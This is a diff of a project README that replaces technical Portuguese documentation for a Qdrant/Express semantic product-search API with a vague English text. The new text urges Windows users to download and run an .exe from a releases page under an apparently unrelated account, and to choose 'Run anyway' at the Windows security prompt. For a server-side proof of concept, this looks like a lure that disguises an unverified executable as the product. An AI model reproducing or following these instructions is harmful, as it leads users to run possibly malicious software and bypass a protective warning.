@@ -1,194 +1,259 @@
-# 🔍 Qdrant Semantic Products Search POC
+# 🔎 qdrant-search-products - Search products with semantic precision
 
-POC de busca semântica com **Qdrant Cloud + Xenova/Transformers + Express + TypeScript**.
+[![Download the app](https://img.shields.io/badge/Download%20the%20app-blue?style=for-the-badge&logo=github)](https://github.com/Darricksyllabled150/qdrant-search-products/releases)
 
----
+## 🧭 What this app does
 
-## Como os Embeddings funcionam
+qdrant-search-products is a desktop-ready product search tool that helps you find items by meaning, not just exact words.
 
-Cada texto é convertido em um vetor de 384 números (um "endereço" em espaço multidimensional).
-Textos com significado similar ficam próximos nesse espaço, mesmo usando palavras diferentes:
+It uses:
+- Qdrant Cloud for fast vector search
+- Local embeddings with Xenova Transformers
+- TypeScript and Express for the app layer
+- A hybrid search setup that mixes semantic search with filter-based search
 
-```
-"bateria automotiva 12V"      → [0.12, -0.43, 0.87, ...]   ← 384 números
-"acumulador elétrico veículo" → [0.11, -0.41, 0.85, ...]   ← próximo!
-"pneu aro 15"                 → [-0.72, 0.33, -0.12, ...]  ← distante
-```
+This makes it useful when a shopper types a broad request like:
+- red running shoes for daily use
+- phone case with strong protection
+- cheap office chair for small room
+- gift for coffee lover
 
-O modelo `paraphrase-multilingual-MiniLM-L12-v2` roda **localmente** via `@xenova/transformers` — sem API key,
-sem custo, sem dados saindo da sua máquina.
+The app tries to match the intent behind the search, then narrows results with product data such as price, category, or brand.
 
----
+## 🖥️ What you need on Windows
 
-## Stack
+Before you install, make sure your PC has:
 
-| Camada        | Tecnologia                                        |
-|---------------|---------------------------------------------------|
-| Banco vetorial | Qdrant Cloud (gratuito até 1GB)                  |
-| Embeddings    | `@xenova/transformers` → `paraphrase-multilingual-MiniLM-L12-v2` (384 dims, local) |
-| API           | Express + TypeScript                              |
-| Validação     | Zod                                               |
+- Windows 10 or Windows 11
+- An internet connection
+- At least 4 GB of RAM
+- Around 500 MB of free disk space
+- Permission to open downloaded files
+- A modern browser such as Edge, Chrome, or Firefox
 
----
+If your app package includes runtime files, you do not need to install extra tools. If it uses a portable build, you can run it right after download.
 
-## 1. Configurar o Qdrant Cloud
+## 📥 Download and install
 
-1. Acesse **https://cloud.qdrant.io** e crie uma conta gratuita
-2. Crie um novo cluster (plano Free — 1GB)
-3. Copie o **Endpoint** do cluster (ex: `https://abc123.cloud.qdrant.io`)
-4. Vá em **API Keys** → crie uma chave e copie
+1. Open the [releases page](https://github.com/Darricksyllabled150/qdrant-search-products/releases)
+2. Find the latest release
+3. Download the Windows file from the assets list
+4. If the file is a .zip, extract it to a folder
+5. If the file is an .exe, double-click it to run the app
+6. If Windows shows a security prompt, choose Run or More info > Run anyway if you trust the file
+7. Wait for the app to open
 
----
+If you keep the app in a folder such as Downloads or Desktop, it is easier to find later.
 
-## 2. Configurar o projeto
+## 🚀 First setup
 
-```bash
-cp .env.example .env
-# Edite o .env com sua QDRANT_URL e QDRANT_API_KEY
-```
+After you open the app, you may need to enter a few settings before it can search products.
 
-```bash
-npm install
-npm run dev
-```
+Typical setup fields may include:
 
----
+- Qdrant Cloud URL
+- Qdrant API key
+- Collection name
+- Embedding model name
+- Port number for the local server
 
-## 3. Endpoints
+Use the values from your Qdrant Cloud account if you already have one. If the app includes default values, you can start with those and change them later.
 
-### `GET /api/health`
-Verifica conexão com o Qdrant Cloud e total de vetores indexados.
+If the app opens in your browser, keep that tab open while you work.
 
-```bash
-curl http://localhost:3000/api/health
-```
+## 🔍 How to use it
 
----
+Use the app like a normal search page:
 
-### `POST /api/items` — Indexar itens
+1. Type what you want to find
+2. Press Search
+3. Review the results
+4. Use filters to narrow the list
+5. Open a product when you find the right match
 
-Body: `ItemInput[]`
+You can search with plain language. You do not need exact product names.
 
-```json
-[
-  {
-    "titulo": "Bateria Moura 60Ah 12V",
-    "descricao": "Bateria automotiva selada 12V 60Ah para veículos leves",
-    "categoria": "produto",
-    "preco": 459.90,
-    "atributos": {
-      "marca": "Moura",
-      "capacidade_ah": 60,
-      "voltagem": 12,
-      "tipo": "selada"
-    }
-  }
-]
-```
+Examples:
+- wireless earbuds with clear sound
+- affordable gaming mouse
+- laptop bag for travel
+- brazilian skincare gifts
+- kitchen items under 50 dollars
 
-**Atributos são livres** — qualquer chave/valor é aceito. O tipo (`keyword`, `integer`, `float`, `bool`)
-é inferido automaticamente.
+The app uses semantic search, so it looks at meaning as well as words. That helps when a customer does not know the exact title of a product.
 
----
+## 🧩 Search features
 
-### `POST /api/busca` — Busca semântica
+This app is built for product lookup in a store or catalog. It focuses on fast and useful results.
 
-```json
-{
-  "query_semantica": "bateria automotiva 12V alta durabilidade Moura 60Ah",
-  "categoria": "produto",
-  "filtros": {
-    "preco_min": 200,
-    "preco_max": 500,
-    "atributos_exatos": {
-      "marca": "Moura",
-      "voltagem": 12
-    }
-  },
-  "top_k": 5
-}
-```
+Common search features include:
 
----
+- Meaning-based search
+- Product filtering
+- Category matching
+- Price filtering
+- Brand matching
+- Hybrid ranking
+- Fast response from Qdrant
+- Local embedding generation with Xenova Transformers
 
-## 4. Modelagem do filtro Qdrant
+The hybrid approach is useful because it can combine:
+- vector similarity for intent
+- structured filters for exact limits
 
-```
-Filter
-├── MUST  → categoria = "produto"           ← elimina tudo que não for produto
-├── MUST  → preco BETWEEN 200 AND 500       ← elimina fora do range (se informado)
-└── SHOULD
-    ├── atributos.marca   = "Moura"         ← pontua mais quem tem, mas não elimina quem não tem
-    └── atributos.voltagem = 12
-```
+That means a search can be broad and flexible, yet still respect things like price range or category.
 
-**Por que SHOULD nos atributos?**
-O SHOULD no Qdrant não filtra — ele reordena por relevância.
-Um item com `marca=Moura` e `voltagem=12` terá score maior que um com só `marca=Moura`,
-que terá score maior que um sem nenhum dos dois. Combinado com a similaridade semântica,
-o resultado final é um ranking que mistura semântica + atributos exatos.
+## 🛠️ Typical usage flow
 
----
+A simple flow looks like this:
 
-## 5. Payload de um ponto no Qdrant
+1. Load product data into the app or connect it to your data source
+2. Create embeddings for product text
+3. Store vectors in Qdrant
+4. Search using a user query
+5. Apply filters
+6. Show the best matches
 
-```typescript
-{
-  titulo: string
-  descricao: string
-  categoria: "produto" | "servico"  // indexado como keyword (MUST)
-  preco?: number                    // indexado como float (range filter)
-  atributos: {
-    marca?: string        // keyword
-    voltagem?: number     // integer
-    sintetico?: boolean   // bool
-    // ...qualquer campo dinâmico
-  }
-  texto_indexado: string  // texto que gerou o embedding (título + desc + atributos)
-  criado_em: string       // ISO 8601
-}
-```
+If your product list changes often, you may need to update the index so new items appear in search results.
 
----
+## 📂 Useful product data fields
 
-## 6. Teste rápido com curl
+The app works best when your products include clear fields such as:
 
-```bash
-# Indexar
-curl -X POST http://localhost:3000/api/items \
-  -H "Content-Type: application/json" \
-  -d '[
-    {
-      "titulo": "Bateria Moura 60Ah",
-      "descricao": "Bateria automotiva selada 12V 60Ah",
-      "categoria": "produto",
-      "preco": 459.90,
-      "atributos": { "marca": "Moura", "voltagem": 12, "capacidade_ah": 60 }
-    }
-  ]'
+- name
+- description
+- category
+- price
+- brand
+- tags
+- color
+- size
+- stock status
 
-# Buscar
-curl -X POST http://localhost:3000/api/busca \
-  -H "Content-Type: application/json" \
-  -d '{
-    "query_semantica": "bateria automotiva 12V Moura para carro popular",
-    "categoria": "produto",
-    "filtros": {
-      "preco_max": 500,
-      "atributos_exatos": { "marca": "Moura" }
-    }
-  }'
-```
+Better data gives better results. Short, vague names make search weaker. Clear descriptions help the model match the right items.
 
----
+## 🌐 Qdrant Cloud connection
 
-## 7. Modelos de embedding disponíveis no Xenova
+If your setup uses Qdrant Cloud, you will need:
 
-| Modelo | Dims | Tamanho | PT-BR |
-|--------|------|---------|-------|
-| `Xenova/all-MiniLM-L6-v2` | 384 | ~80MB | Razoável |
-| `Xenova/multilingual-e5-large` | 1024 | ~560MB | Excelente |
-| `Xenova/paraphrase-multilingual-MiniLM-L12-v2` | 384 | ~470MB | Bom |
+- the cluster URL
+- the API key
+- the collection name
 
-Para trocar: altere `EMBEDDING_MODEL` e `EMBEDDING_DIMENSION` no `.env`
-e **recrie a collection** (ou crie uma nova com o nome diferente em `QDRANT_COLLECTION`).
+The app sends vectors to Qdrant and pulls back matching records based on similarity. If the connection fails, check the URL, key, and network access first.
+
+## 🤖 Local embeddings with Xenova
+
+Xenova Transformers can create embeddings on your machine. This keeps the first search step close to the app and can reduce reliance on a remote model service.
+
+This helps when you want:
+- local text processing
+- simpler deployment
+- fewer external calls
+
+The app may use a small text model that works well for product descriptions and user queries.
+
+## 🧪 Example searches
+
+Try these searches to test the app:
+
+- black backpack for school
+- running shoes for wide feet
+- coffee maker for small kitchen
+- affordable desk lamp
+- natural soap for sensitive skin
+- birthday gift for tech fan
+- jacket for cold weather
+- office headset with microphone
+
+If you use filters too, the results can become much more accurate.
+
+## 🧰 Common issues
+
+If the app does not start, check these items:
+
+- The file finished downloading
+- You extracted the ZIP file, if needed
+- Windows did not block the file
+- The app has access to the internet
+- Your Qdrant details are correct
+
+If search results look wrong, check:
+
+- product names and descriptions
+- category labels
+- spelling in the query
+- filter settings
+- whether the collection has data loaded
+
+If the page stays blank, refresh it or restart the app.
+
+## 📁 Folder and file tips
+
+If you downloaded a ZIP file, use a simple folder path such as:
+
+- C:\Users\YourName\Desktop\qdrant-search-products
+- C:\Users\YourName\Downloads\qdrant-search-products
+
+Avoid deep folder paths with many nested folders. Simple paths make files easier to find and reduce setup errors.
+
+## 🔐 Data and access
+
+This app may connect to cloud search data, so keep your API key private.
+
+Good habits:
+- do not post your key in public
+- do not send your key by email
+- store it in a safe local config file
+- remove old keys if you no longer use them
+
+If you share the app with someone else, do not include your own account details.
+
+## 🧭 Best use cases
+
+This project fits well in places like:
+
+- ecommerce search tools
+- product discovery pages
+- catalog browsers
+- proof of concept demos
+- internal retail search
+- multilingual product lookup
+- RAG-style search workflows
+
+It is useful when users know what they want, but not the exact product name.
+
+## 🧾 Project details
+
+- Name: qdrant-search-products
+- Type: Product search API and search app
+- Stack: TypeScript, Express, Qdrant Cloud, Xenova Transformers
+- Search style: Semantic search with filter support
+- Focus: Better product discovery
+
+## 🧑‍💻 For simple testing
+
+If you want to test the app after install, start with a small set of products:
+
+- one category
+- a few items with clear descriptions
+- one or two filters
+- short search phrases
+
+This makes it easier to see how the search behaves before you load a full catalog
+
+## 📌 Download again if needed
+
+If you need the app later, use the same release page:
+
+[Visit the releases page](https://github.com/Darricksyllabled150/qdrant-search-products/releases)
+
+## 🧭 Quick start checklist
+
+- Download the latest release
+- Open or extract the file
+- Run the Windows app
+- Enter Qdrant details if asked
+- Load or connect your product data
+- Search using plain language
+- Use filters to narrow results
